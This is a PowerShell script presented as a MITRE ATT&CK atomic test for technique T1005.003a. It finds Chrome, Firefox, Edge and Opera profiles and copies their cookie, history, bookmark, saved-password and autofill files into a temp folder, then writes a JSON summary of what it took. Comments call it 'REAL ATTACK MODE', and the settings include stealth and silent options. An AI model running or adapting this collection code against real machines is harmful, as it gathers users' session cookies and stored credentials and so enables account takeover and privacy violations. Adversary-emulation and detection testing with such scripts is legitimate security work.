# T1005.003a - Data from Local System: Browser Stored Data
# MITRE ATT&CK Enterprise - Collection Tactic
# ATOMIC ACTION: Extract browser stored data ONLY (cookies, history, passwords)
# Platform: Windows | Privilege: User | Type: Atomic Package

param()

function Get-Configuration {
    return @{
        # REAL ATTACK MODE - Hardcoded variables for real attack
        "OUTPUT_BASE" = "$env:TEMP\mitre_results"
        "TIMEOUT" = 30

        # T1005.003a - REAL ATTACK MODE - Complete browser data extraction
        T1005_003A_BROWSER_TYPES = @("chrome", "firefox", "edge", "opera", "vivaldi", "brave")
        T1005_003A_DATA_TYPES = @("cookies", "history", "bookmarks", "passwords", "autofill", "downloads", "extensions", "preferences")
        T1005_003A_MAX_FILE_SIZE_MB = 500
        T1005_003A_DECRYPT_PASSWORDS = $true
        T1005_003A_INCLUDE_PROFILES = $true
        T1005_003A_COPY_FILES = $true
        T1005_003A_ANALYZE_SQLITE = $true
        T1005_003A_OUTPUT_MODE = "debug"
        T1005_003A_SILENT_MODE = $false
        T1005_003A_STEALTH_MODE = $false
    }
}

function Invoke-MicroTechniqueAction {
    param([hashtable]$Config)
    
    # ATOMIC ACTION: Browser stored data extraction ONLY
    if (-not $Config.T1005_003A_SILENT_MODE) {
        Write-Host "[INFO] Starting atomic browser stored data extraction..." -ForegroundColor Yellow
    }
    
    $browserResults = @{
        "action" =  "browser_stored_data_extraction"
        "technique_id" =  "T1005.003a"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" =  "user"
    }
    
    $extractedData = @()
    $totalFilesExtracted = 0
    $totalSizeMB = 0
    
    try {
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1005.003a-browser_data"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }
        
        # Browser data paths
        $browserPaths = @{
            "chrome" = @{
                "profile_path" =  "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
                "files" = @{
                    "cookies" = "Cookies"
                    "history" = "History"
                    "bookmarks" = "Bookmarks"
                    "passwords" = "Login Data"
                    "autofill" = "Web Data"
                }
            }
            "firefox" = @{
                "profile_path" =  "$env:APPDATA\Mozilla\Firefox\Profiles"
                "files" = @{
                    "cookies" = "cookies.sqlite"
                    "history" = "places.sqlite"
                    "bookmarks" = "places.sqlite"
                    "passwords" = "logins.json"
                    "autofill" = "formhistory.sqlite"
                }
            }
            "edge" = @{
                "profile_path" =  "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
                "files" = @{
                    "cookies" = "Cookies"
                    "history" = "History"
                    "bookmarks" = "Bookmarks"
                    "passwords" = "Login Data"
                    "autofill" = "Web Data"
                }
            }
            "opera" = @{
                "profile_path" =  "$env:APPDATA\Opera Software\Opera Stable"
                "files" = @{
                    "cookies" = "Cookies"
                    "history" = "History"
                    "bookmarks" = "Bookmarks"
                    "passwords" = "Login Data"
                }
            }
        }
        
        foreach ($browserName in $Config.T1005_003A_BROWSER_TYPES) {
            if (-not $browserPaths.ContainsKey($browserName)) {
                continue
            }
            
            $browser = $browserPaths[$browserName]
            $profilePath = $browser.profile_path
            
            if (-not $Config.T1005_003A_SILENT_MODE) {
                Write-Host "[INFO] Processing browser: $browserName" -ForegroundColor Cyan
            }
            
            $browserInfo = @{
                "browser_name" = $browserName
                "profile_path" = $profilePath
                "profile_exists" = Test-Path $profilePath
                "files_extracted" = @()
                "extraction_errors" = @()
            }
            
            if ($browserInfo.profile_exists) {
                # Handle Firefox profiles (multiple profiles possible)
                if ($browserName -eq "firefox") {
                    $firefoxProfiles = Get-ChildItem $profilePath -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "\.default" }
                    foreach ($profile in $firefoxProfiles) {
                        $actualProfilePath = $profile.FullName
                        $browserInfo = Process-BrowserProfile -BrowserName $browserName -ProfilePath $actualProfilePath -Browser $browser -Config $Config -OutputDir $outputDir
                        $extractedData += $browserInfo
                    }
                } else {
                    $browserInfo = Process-BrowserProfile -BrowserName $browserName -ProfilePath $profilePath -Browser $browser -Config $Config -OutputDir $outputDir
                    $extractedData += $browserInfo
                }
            } else {
                $browserInfo.error = "Profile path not found"
                $extractedData += $browserInfo
            }
        }
        
        # Calculate totals
        foreach ($browser in $extractedData) {
            $totalFilesExtracted += $browser.files_extracted.Count
            foreach ($file in $browser.files_extracted) {
                if ($file.size_mb) {
                    $totalSizeMB += $file.size_mb
                }
            }
        }
        
        $browserResults.results = @{
            "status" =  "success"
            "browsers_processed" = $extractedData.Count
            "total_files_extracted" = $totalFilesExtracted
            "total_size_mb" = [math]::Round($totalSizeMB, 2)
            "browser_data" = $extractedData
            "configuration_used" = @{
                "browser_types" = $Config.T1005_003A_BROWSER_TYPES
                "data_types" = $Config.T1005_003A_DATA_TYPES
                "max_file_size_mb" = $Config.T1005_003A_MAX_FILE_SIZE_MB
                "copy_files" = $Config.T1005_003A_COPY_FILES
                "include_profiles" = $Config.T1005_003A_INCLUDE_PROFILES
            }
            "output_directory" = $outputDir
        }
        
        if (-not $Config.T1005_003A_SILENT_MODE) {
            Write-Host "[SUCCESS] Browser data extraction completed: $totalFilesExtracted files from $($extractedData.Count) browsers" -ForegroundColor Green
        }
    }
    catch {
        $browserResults.results = @{
            "status" =  "error"
            "error" = $_.Exception.Message
            "files_extracted" = $totalFilesExtracted
        }
        
        if (-not $Config.T1005_003A_SILENT_MODE) {
            Write-Error "Browser data extraction failed: $($_.Exception.Message)"
        }
    }
    
    return $browserResults
}

function Process-BrowserProfile {
    param($BrowserName, $ProfilePath, $Browser, $Config, $OutputDir)
    
    $browserInfo = @{
        "browser_name" = $BrowserName
        "profile_path" = $ProfilePath
        "profile_exists" = Test-Path $ProfilePath
        "files_extracted" = @()
        "extraction_errors" = @()
    }
    
    if (-not $browserInfo.profile_exists) {
        $browserInfo.error = "Profile path not found"
        return $browserInfo
    }
    
    foreach ($dataType in $Config.T1005_003A_DATA_TYPES) {
        if (-not $Browser.files.ContainsKey($dataType)) {
            continue
        }
        
        $fileName = $Browser.files[$dataType]
        $filePath = Join-Path $ProfilePath $fileName
        
        if (Test-Path $filePath) {
            try {
                $fileInfo = Get-Item $filePath
                $fileSizeMB = [math]::Round($fileInfo.Length / 1MB, 2)
                
                # Check size limit
                if ($fileSizeMB -le $Config.T1005_003A_MAX_FILE_SIZE_MB) {
                    $extractedFileInfo = @{
                        "data_type" = $dataType
                        "original_path" = $filePath
                        "file_name" = $fileName
                        "size_bytes" = $fileInfo.Length
                        "size_mb" = $fileSizeMB
                        "last_modified" = $fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                        "extraction_time" = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                    }
                    
                    # Copy file if requested
                    if ($Config.T1005_003A_COPY_FILES) {
                        $browserOutputDir = Join-Path $OutputDir $BrowserName
                        if (-not (Test-Path $browserOutputDir)) {
                            New-Item -Path $browserOutputDir -ItemType Directory -Force | Out-Null
                        }
                        
                        $destinationPath = Join-Path $browserOutputDir "${dataType}_$fileName"
                        Copy-Item $filePath $destinationPath -Force
                        
                        $extractedFileInfo.copied_to = $destinationPath
                        $extractedFileInfo.copy_success = Test-Path $destinationPath
                    }
                    
                    # Basic SQLite analysis if requested
                    if ($Config.T1005_003A_ANALYZE_SQLITE -and $fileName -like "*.sqlite") {
                        try {
                            # Simple SQLite file validation
                            $fileHeader = [System.IO.File]::ReadAllBytes($filePath)[0..15]
                            $isSQLite = [System.Text.Encoding]::ASCII.GetString($fileHeader[0..5]) -eq "SQLite"
                            
                            $extractedFileInfo.sqlite_analysis = @{
                                "is_sqlite_file" = $isSQLite
                                "file_header" = [System.Convert]::ToHexString($fileHeader)
                            }
                        } catch {
                            $extractedFileInfo.sqlite_analysis_error = $_.Exception.Message
                        }
                    }
                    
                    $browserInfo.files_extracted += $extractedFileInfo
                } else {
                    $browserInfo.extraction_errors += "File too large: $fileName ($fileSizeMB MB > $($Config.T1005_003A_MAX_FILE_SIZE_MB) MB)"
                }
            } catch {
                $browserInfo.extraction_errors += "Failed to process $fileName`: $($_.Exception.Message)"
            }
        } else {
            $browserInfo.extraction_errors += "File not found: $fileName"
        }
    }
    
    return $browserInfo
}

function Write-StandardizedOutput {
    param([hashtable]$Data, [hashtable]$Config)
    
    $outputDir = Join-Path $Config.OUTPUT_BASE "t1005.003a-browser_data"
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }
    
    switch ($Config.T1005_003A_OUTPUT_MODE) {
        "simple" {
            if ($Data.results.status -eq "success") {
                $simpleOutput = "Browser data extracted: $($Data.results.total_files_extracted) files ($($Data.results.total_size_mb) MB)"
            } else {
                $simpleOutput = "Browser data extraction failed: $($Data.results.error)"
            }
            
            if (-not $Config.T1005_003A_SILENT_MODE) {
                Write-Output $simpleOutput
            }
            
            $simpleOutput | Out-File -FilePath (Join-Path $outputDir "browser_data_simple.txt") -Encoding UTF8
        }
        
        "stealth" {
            $jsonFile = Join-Path $outputDir "browser_stored_data.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
        }
        
        "debug" {
            $jsonFile = Join-Path $outputDir "browser_stored_data.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            
            if (-not $Config.T1005_003A_SILENT_MODE) {
                Write-Host "[DEBUG] Browser data written to: $jsonFile" -ForegroundColor Cyan
            }
        }
    }
    
    return $outputDir
}

function Main {
    try {
        $Config = Get-Configuration
        $results = Invoke-MicroTechniqueAction -Config $config
        $outputPath = Write-StandardizedOutput -Data $results -Config $config
        
        if (-not $Config.T1005_003A_SILENT_MODE) {
            Write-Host "[COMPLETE] T1005.003a atomic execution finished - Output: $outputPath" -ForegroundColor Green
        }
        
        return 0
    }
    catch {
        if (-not $Config.T1005_003A_SILENT_MODE) {
            Write-Error "T1005.003a execution failed: $($_.Exception.Message)"
        }
        return 1
    }
}

exit (Main)


